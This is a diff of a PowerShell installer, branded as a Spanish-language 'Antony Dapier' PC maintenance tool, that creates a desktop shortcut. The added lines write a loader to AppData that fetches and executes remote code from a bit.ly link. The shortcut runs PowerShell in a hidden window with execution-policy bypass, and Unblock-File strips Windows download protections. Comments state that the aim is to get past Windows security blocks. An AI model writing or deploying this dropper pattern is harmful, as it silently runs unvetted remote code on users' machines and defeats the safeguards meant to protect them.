@@ -11,18 +11,21 @@ if (Test-Path $ShortcutPath) { Remove-Item $ShortcutPath -Force }
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
 
-# Usamos cmd.exe como puente para evitar el bloqueo de "Acceso Denegado" de Windows
-$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
+# Creamos un script cargador local en AppData para que Windows no bloquee el acceso directo
+$appFolder = Join-Path $env:APPDATA "AntonyDapier"
+if (-not (Test-Path $appFolder)) { New-Item -ItemType Directory -Path $appFolder -Force | Out-Null }
+$loaderPath = Join-Path $appFolder "mantenimiento_v10.ps1"
+'iex (irm https://bit.ly/mandia-windows)' | Set-Content -Path $loaderPath -Force
 
-# El comando lanza PowerShell de forma totalmente invisible
-$PSCommand = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""iex (irm https://bit.ly/mandia-windows)"""
-$Shortcut.Arguments = "/c start /min """" $PSCommand"
+# El acceso directo ahora apunta a un archivo local, lo cual evita el bloqueo de seguridad
+$Shortcut.TargetPath = "$PSHOME\powershell.exe"
+$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$loaderPath"""
 
-$Shortcut.IconLocation = "powershell.exe,0" # Usamos el icono oficial de PowerShell
+$Shortcut.IconLocation = "shell32.dll,70" # Icono de sistema para mantenimiento
 $Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
-$Shortcut.WindowStyle = 7 # Minimizado para que no se vea el flash negro de CMD
 $Shortcut.Save()
 
-[System.Windows.MessageBox]::Show("¡Configuración Exitosa!`n`nSe ha creado el acceso directo en tu escritorio. Al abrirlo, Windows te pedirá permiso de administrador para iniciar la optimización.", "Antony Dapier", "OK", "Information")
+Unblock-File -Path $ShortcutPath -ErrorAction SilentlyContinue
+Unblock-File -Path $loaderPath -ErrorAction SilentlyContinue
 
-[System.Windows.MessageBox]::Show("¡Instalación completada!`n`nSe ha creado el acceso directo 'Optimizar PC - Antony Dapier' en tu escritorio. Ya puedes cerrar esta ventana y usar la herramienta.", "Antony Dapier - Mantenimiento", "OK", "Information")
+[System.Windows.MessageBox]::Show("¡Instalación completada con éxito!`n`nSe ha creado el acceso directo en tu escritorio. Al abrirlo, el sistema cargará tu herramienta y solicitará permisos de administrador.", "Antony Dapier - Mantenimiento", "OK", "Information")
